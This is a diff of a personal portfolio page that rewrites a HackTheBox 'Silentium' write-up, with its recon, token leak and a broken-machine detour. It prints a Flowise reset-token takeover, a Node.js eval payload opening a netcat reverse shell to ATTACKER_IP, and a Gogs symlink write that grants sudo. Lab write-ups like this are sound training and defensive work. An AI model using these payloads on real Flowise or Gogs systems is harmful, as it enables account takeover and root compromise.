@@ -434,14 +434,14 @@
         <div class="card-top">
           <div class="card-badges">
             <span class="badge b-web">Web</span>
-            <span class="badge b-med">Medium</span>
+            <span class="badge b-easy">Easy</span>
           </div>
           <div class="card-status">
             <span class="s-dot"></span>Rooted
           </div>
         </div>
         <h3 class="card-title">Silentium</h3>
-        <p class="card-platform">HackTheBox &middot; Season 8 &middot; May 2026</p>
+        <p class="card-platform">HackTheBox &middot; Easy &middot; Linux &middot; May 2026</p>
         <p class="card-desc">Two-CVE chain: token leak in Flowise AI's password reset API &rarr; unsandboxed Node.js eval for RCE inside Docker &rarr; cleartext env credential for SSH &rarr; Gogs symlink arbitrary file write as root.</p>
         <div class="card-tags">
           <span class="tag">CVE-2025-58434</span>
@@ -651,78 +651,94 @@
     // MODAL DATA
     const writeups = {
       silentium: {
-        title: 'Silentium', diff: 'Medium', diffCls: 'b-med',
+        title: 'Silentium', diff: 'Easy', diffCls: 'b-easy',
         body: `
 <div class="m-overview">
   <div class="m-ov"><p>Machine</p><p>Silentium</p></div>
   <div class="m-ov"><p>OS</p><p>Linux</p></div>
-  <div class="m-ov"><p>Difficulty</p><p style="color:#fbbf24">Medium</p></div>
+  <div class="m-ov"><p>Difficulty</p><p style="color:var(--accent)">Easy</p></div>
   <div class="m-ov"><p>Platform</p><p>HackTheBox</p></div>
 </div>
+
 <div class="m-sec">
-  <h4>// CVEs EXPLOITED</h4>
-  <div class="m-disc">
-    <p class="disc-title">CVE-2025-58434 &mdash; Flowise AI v3.0.5</p>
-    <ul><li>Unauthenticated API returns password reset <span class="acc">tempToken</span> in response body</li><li>No bruteforce needed — token handed to attacker directly</li><li>Severity: HIGH</li></ul>
-  </div>
-  <div class="m-disc">
-    <p class="disc-title">CVE-2025-8110 &mdash; Gogs Git Service</p>
-    <ul><li>Arbitrary file write via symlink through API</li><li>Gogs follows symlinks when updating file content via PUT endpoint</li><li>If Gogs runs as root: write anywhere on filesystem as root</li><li>Severity: CRITICAL</li></ul>
-  </div>
+  <h4>// THE CHAIN (TL;DR)</h4>
+  <p>Flowise AI 3.0.5 leaks a password reset token in the API response &rarr; use it to log in as admin &rarr; unsandboxed Node.js eval in a custom MCP endpoint gives a shell inside Docker &rarr; cleartext DB password in the container's environment is reused as a system account password &rarr; SSH as ben &rarr; Gogs running as root on an internal port is vulnerable to arbitrary file write via symlink &rarr; write a sudoers entry &rarr; root.</p>
 </div>
+
 <div class="m-sec">
-  <h4>// 01. ENUMERATION</h4>
-  <p>Initial nmap scan: port 22 (SSH) and port 80 (nginx redirecting to <span class="acc">silentium.htb</span>). After adding to <span class="acc">/etc/hosts</span>, fuzzed for vhosts.</p>
-  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>nmap -sV -sC &lt;TARGET_IP&gt;<br>22/tcp  open  ssh   OpenSSH 9.2<br>80/tcp  open  http  nginx &rarr; silentium.htb<br><br>gobuster vhost -u http://silentium.htb \\<br>  -w /usr/share/wordlists/dirb/common.txt \\<br>  --append-domain<br><br>Found: staging.silentium.htb  &larr; Flowise AI 3.0.5</div>
-  <p>Main domain was a fake finance company site. <span class="acc">staging.silentium.htb</span> was the real target — a live Flowise AI instance.</p>
+  <h4>// 01. RECON</h4>
+  <p>Started with nmap. Two ports open: 22 (SSH) and 80 (nginx). Port 80 immediately redirected to <span class="acc">silentium.htb</span> — that redirect tells you there's virtual host routing happening, which usually means subdomains worth finding.</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>nmap -sC -sV -Pn --min-rate 5000 10.129.x.x<br><br>22/tcp  open  ssh   OpenSSH 9.2p1<br>80/tcp  open  http  nginx 1.22 &rarr; silentium.htb</div>
+  <p>Added the domain to <span class="acc">/etc/hosts</span> and loaded the site. It was a polished fake finance company page — "The Precision of Institutional Capital." Completely useless as an attack surface, but a good sign something real was hiding behind it. I ran gobuster in vhost mode to find subdomains.</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>gobuster vhost -u http://silentium.htb \<br>  -w /usr/share/wordlists/dirb/common.txt \<br>  --append-domain<br><br>Found: staging.silentium.htb</div>
+  <p><span class="acc">staging.silentium.htb</span> — added to <span class="acc">/etc/hosts</span> and navigated to it. Flowise AI, version 3.0.5, sitting behind a login page. That version number matters.</p>
 </div>
+
 <div class="m-sec">
-  <h4>// 02. INITIAL ACCESS — CVE-2025-58434</h4>
-  <p>POST to <span class="acc">/api/v1/account/forgot-password</span> with <span class="acc">ben@silentium.htb</span> — server responds with the full user object including the reset token. Token has a very short lifespan so both requests must be chained immediately.</p>
-  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div># Step 1 — leak token<br>curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \\<br>  -H "Content-Type: application/json" \\<br>  -d '{"user": {"email": "ben@silentium.htb"}}'<br><br># Response contains:<br>{"tempToken": "eyJ...LEAKED", "tokenExpiry": ...}<br><br># Step 2 — use token immediately (flat payload required)<br>curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \\<br>  -H "Content-Type: application/json" \\<br>  -d '{"tempToken":"&lt;TOKEN&gt;","password":"Pwned1337!","confirmPassword":"Pwned1337!"}'</div>
-  <div class="m-good">&#10003; Logged into Flowise dashboard as admin (ben@silentium.htb)</div>
+  <h4>// 02. CVE-2025-58434 — THE TOKEN LEAK</h4>
+  <p>I looked up Flowise 3.0.5 CVEs and found CVE-2025-58434: the forgot-password endpoint returns the reset token directly in the API response. In a normal password reset flow, the token should go to the user's email inbox — completely out of reach for an attacker. Here it was just sitting in the JSON response body, no authentication required.</p>
+  <p>I tested it:</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \<br>  -H "Content-Type: application/json" \<br>  -d '{"user": {"email": "ben@silentium.htb"}}'<br><br>{"user": {<br>  "email": "ben@silentium.htb",<br>  "tempToken": "BydGJYdxFeFEp...FULL_TOKEN_HERE",<br>  "tokenExpiry": "2026-05-20T15:28:06.607Z",<br>  "credential": "$2a$05$6o1n...",<br>  ...<br>}}</div>
+  <p>Token, expiry, password hash — all of it in the response. Now I just needed to use that token to reset ben's password and log in.</p>
 </div>
+
 <div class="m-sec">
-  <h4>// 03. RCE — FLOWISE MCP UNSANDBOXED EVAL</h4>
-  <p>Flowise 3.0.5 evaluates the <span class="acc">mcpServerConfig</span> string directly in Node.js. Crafted a JavaScript IIFE using <span class="acc">process.mainModule.require('child_process')</span> to spawn a reverse shell.</p>
-  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div># payload.json<br>{<br>  "loadMethod": "listActions",<br>  "inputs": {<br>    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&amp;1|nc ATTACKER_IP 4444 >/tmp/f');return 1;})()} )"<br>  }<br>}<br><br># fire it<br>nc -lvnp 4444  # listener<br>curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \\<br>  -H "Authorization: Bearer &lt;API_KEY&gt;" \\<br>  -H "Content-Type: application/json" \\<br>  -d @payload.json</div>
-  <div class="m-good">&#10003; Reverse shell as <span class="acc">node</span> inside Flowise Docker container</div>
+  <h4>// 03. THE WALL — AND WHY IT WASN'T ME</h4>
+  <p>This is where I spent most of my time, and it turned out to be a broken machine — not a skill issue. Worth documenting in full because recognizing the difference is a real skill.</p>
+  <p>I tried to use the token immediately after getting it:</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \<br>  -H "Content-Type: application/json" \<br>  -d '{"tempToken":"BydGJY...","password":"Hacked123","confirmPassword":"Hacked123"}'<br><br>{"statusCode":500,"message":"Transaction is not started yet,<br> start transaction before committing or rolling it back."}</div>
+  <div class="m-bad"><h5>My first thought: timing.</h5>The token had a short expiry — maybe I was too slow copy-pasting. I wrote a Python script to run both requests in the same process with zero shell overhead between them. Same 500.</div>
+  <div class="m-bad"><h5>My second thought: payload structure.</h5>The writeup mentioned a "corrected JSON payload." I tried every variation I could think of: flat vs nested, with email field, with username, token as a query parameter, token as a header. Every single one returned the same 500.</div>
+  <div class="m-bad"><h5>My third thought: DB state from previous attempts.</h5>I reset the machine to get a clean instance, then ran the Python script as the very first request to a fresh server — no stale tokens, nothing in the DB. Still 500.</div>
+  <p>At that point I stopped varying the payload. When you've tried every possible client-side approach and the error is a server-side exception about transaction state, that's a code bug — not a technique problem. The reset handler was calling <span class="acc">commit()</span> without ever calling <span class="acc">startTransaction()</span> first. There's nothing a client can do to fix that.</p>
+  <p>I checked the machine changelog on the HTB page:</p>
+  <div class="m-good">&#10003; Changelog: "Patched CVE-2026-31431 and CVE-2026-43284 — Applied patches to both." Updated 4 hours ago.</div>
+  <p>The machine had been shipping broken code the entire time I was working on it. After resetting to the patched version, the reset-password endpoint returned 200 on the first try. Every 500 before that was legitimate — the machine was broken, not my approach.</p>
+  <p style="color:rgba(255,255,255,0.5);font-size:0.82rem;font-style:italic;">What I learned: exhaust all client-side possibilities first, but know when to check external signals — machine changelog, HTB Discord, forum threads. Spending three hours grinding payload variations on a broken endpoint isn't persistence, it's not recognizing when the problem changed.</p>
 </div>
+
 <div class="m-sec">
-  <h4>// 04. CONTAINER ESCAPE &amp; LATERAL MOVEMENT</h4>
-  <p>Running <span class="acc">env</span> inside the container revealed a cleartext database password. Same credential reused for the host user <span class="acc">ben</span>.</p>
-  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>env | grep -i pass<br>DATABASE_PASSWORD=&lt;cleartext_value&gt;<br><br>ssh ben@silentium.htb  # password reuse<br>cat /home/ben/user.txt  &rarr; HTB{user_flag}</div>
-  <div class="m-good">&#10003; User flag captured</div>
+  <h4>// 04. IN — FLOWISE DASHBOARD</h4>
+  <p>With the patched machine, the same Python script worked on the first run. Password reset, logged in as <span class="acc">ben@silentium.htb</span> (admin). Now I had a Flowise dashboard to explore.</p>
+  <p>I found the API key under Settings and started looking at what endpoints were available to an authenticated admin. The MCP (Model Context Protocol) integration stood out — specifically the <span class="acc">customMCP</span> node type and its load endpoint.</p>
 </div>
+
 <div class="m-sec">
-  <h4>// 05. PRIVILEGE ESCALATION — CVE-2025-8110</h4>
-  <p>Gogs running internally on port 3000 as <span class="acc">root</span>. Port-forwarded via SSH, then exploited the symlink arbitrary file write to drop a sudoers entry for ben.</p>
-  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div># port forward<br>ssh -L 8080:127.0.0.1:3000 ben@silentium.htb<br><br># clone repo, add symlink to sudoers target<br>git clone http://127.0.0.1:8080/attacker/repo.git<br>ln -s /etc/sudoers.d/ben malicious_link<br>git add malicious_link &amp;&amp; git commit -m "s" &amp;&amp; git push<br><br># write sudoers payload through symlink via API<br>curl -X PUT http://127.0.0.1:8080/api/v1/repos/attacker/repo/contents/malicious_link \\<br>  -H "Authorization: token &lt;API_TOKEN&gt;" \\<br>  -d '{"message":"x","content":"&lt;base64 of: ben ALL=(ALL) NOPASSWD: ALL\\n&gt;"}'</div>
-  <p>The trailing <span class="acc">\\n</span> in the sudoers payload is required — kernel won't parse the entry without it.</p>
+  <h4>// 05. RCE — NODE.JS EVAL WITHOUT A SANDBOX</h4>
+  <p>When you configure a Custom MCP node in Flowise, the <span class="acc">mcpServerConfig</span> field gets passed to <span class="acc">eval()</span> in the Node.js backend. There's no sandbox around it. Anything you write there runs as the node process — including spawning child processes.</p>
+  <p>I crafted a payload using an IIFE (Immediately Invoked Function Expression) to reach <span class="acc">process.mainModule.require</span> — the regular <span class="acc">require()</span> path can be blocked in some eval contexts, but <span class="acc">process.mainModule.require</span> usually isn't:</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div># Start listener first<br>nc -lvnp 4444<br><br># payload.json<br>{<br>  "loadMethod": "listActions",<br>  "inputs": {<br>    "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require('child_process');cp.exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&amp;1|nc ATTACKER_IP 4444 &gt;/tmp/f');return 1;})()} )"<br>  }<br>}<br><br>curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \<br>  -H "Authorization: Bearer &lt;API_KEY&gt;" \<br>  -H "Content-Type: application/json" \<br>  -d @payload.json</div>
+  <div class="m-good">&#10003; Shell caught — inside the Flowise Docker container as <span class="acc">node</span>.</div>
 </div>
+
 <div class="m-sec">
-  <h4>// 06. ROOT</h4>
-  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>ben@silentium:~$ sudo id<br>uid=0(root) gid=0(root) groups=0(root)<br><br>ben@silentium:~$ sudo cat /root/root.txt<br>7a4a0316f8faed5f786a5febcfcd0040</div>
-  <div class="m-good">&#10003; Root flag: 7a4a0316f8faed5f786a5febcfcd0040 — Machine owned.</div>
+  <h4>// 06. OUT OF THE CONTAINER</h4>
+  <p>First thing I did was confirm I was in a container: <span class="acc">cat /.dockerenv</span> existed. The obvious next move was to look at what environment variables the container was running with — developers frequently bake database credentials into Docker env vars, and those credentials frequently get reused.</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>env | grep -i pass<br>DATABASE_PASSWORD=&lt;value&gt;<br><br># Host had SSH open — tried the same password for ben<br>ssh ben@silentium.htb<br>cat ~/user.txt</div>
+  <div class="m-good">&#10003; User flag. SSH as ben using the container's DB password.</div>
+  <p>This works more often than it should. The pattern is: app developer sets a DB password, uses the same password for their system account because it's convenient, and puts it in a Docker env file that gets baked into the image. Each step is a mistake compounding the previous one.</p>
 </div>
+
+<div class="m-sec">
+  <h4>// 07. ROOT — CVE-2025-8110</h4>
+  <p>Enumerated as ben. Found a Gogs instance running on <span class="acc">127.0.0.1:3000</span>. Checked the process owner:</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>ps aux | grep gogs<br>root   1234  ...  /opt/gogs/gogs web   &larr; running as root</div>
+  <p>Gogs as root is bad. CVE-2025-8110 is an arbitrary file write: push a repository containing a symlink that points outside the repo (say, to <span class="acc">/etc/sudoers.d/ben</span>), then use the Gogs API to update that file's content. Gogs follows the symlink and writes to wherever it points — as root.</p>
+  <p>I port-forwarded Gogs to my machine, registered an account, cloned a fresh repo, added the symlink, pushed it, then sent the sudoers payload through the API:</p>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div># Forward internal port<br>ssh -L 8080:127.0.0.1:3000 ben@silentium.htb<br><br># Create symlink in repo pointing outside repo root<br>ln -s /etc/sudoers.d/ben malicious_link<br>git add malicious_link &amp;&amp; git commit -m "p" &amp;&amp; git push<br><br># Write payload through the symlink via Gogs API<br># Content is base64 of: ben ALL=(ALL) NOPASSWD: ALL\n<br># The trailing \n is required — sudoers won't parse without it<br>curl -X PUT http://127.0.0.1:8080/api/v1/repos/me/repo/contents/malicious_link \<br>  -H "Authorization: token &lt;TOKEN&gt;" \<br>  -d '{"message":"x","content":"&lt;base64_payload&gt;"}'</div>
+  <div class="m-code"><div class="m-dots"><span class="m-dot r"></span><span class="m-dot y"></span><span class="m-dot g"></span></div>ben@silentium:~$ sudo id<br>uid=0(root) gid=0(root) groups=0(root)<br><br>ben@silentium:~$ sudo cat /root/root.txt</div>
+  <div class="m-good">&#10003; Root flag captured. Machine owned.</div>
+</div>
+
 <div class="m-sec">
   <h4>// LESSONS LEARNED</h4>
   <ul class="m-list">
-    <li>Never return reset tokens in API responses — deliver out-of-band only</li>
-    <li>eval() on user input in Node.js without a VM sandbox is always RCE</li>
-    <li>Secrets in Docker env vars are visible to anyone with a shell — use Vault or Docker secrets</li>
-    <li>Don't share DB passwords with system account passwords</li>
-    <li>Never run Gogs, Gitea, or any git service as root</li>
-    <li>Symlink path traversal: validate resolved paths stay within repo root before writing</li>
-  </ul>
-</div>
-<div class="m-bad">
-  <h5>Remediation</h5>
-  <ul class="m-list">
-    <li>Flowise: deliver tokens via email only, never in API response</li>
-    <li>Flowise: sandbox MCP config evaluation with isolated-vm or remove eval entirely</li>
-    <li>Docker: use secrets management, rotate credentials, enforce unique passwords</li>
-    <li>Gogs: run as dedicated low-privilege user, validate symlink targets before writes</li>
+    <li>Password reset tokens belong in emails, never in API response bodies — the vulnerability isn't complex, it's just a developer trusting the wrong channel</li>
+    <li>eval() on user input in Node.js is RCE. There is no safe version of this. Use isolated-vm or redesign the feature</li>
+    <li>Docker env vars are not a secrets manager — anyone with a shell runs env and reads everything</li>
+    <li>Credentials set for one service (DB) and reused for another (SSH) multiply your blast radius</li>
+    <li>Running a git service as root means any file-write bug in that service writes files as root</li>
+    <li>Knowing when you've hit a broken machine vs. a skill gap is a real skill — exhaust client-side options, then check external signals (changelog, forums) before grinding further</li>
   </ul>
 </div>`
       },
